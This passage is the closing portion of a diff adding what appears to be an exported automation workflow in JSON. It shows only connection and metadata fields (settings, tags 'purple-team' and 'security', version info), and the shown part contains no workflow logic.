+            "index": 0
+          }
+        ]
+      ]
+    }
+  },
+  "pinData": {},
+  "settings": {
+    "executionOrder": "v1"
+  },
+  "staticData": null,
+  "tags": [
+    {
+      "name": "purple-team"
+    },
+    {
+      "name": "security"
+    }
+  ],
+  "triggerCount": 0,
+  "updatedAt": "2026-02-06T00:00:00.000Z",
+  "versionId": "1"
+}
+
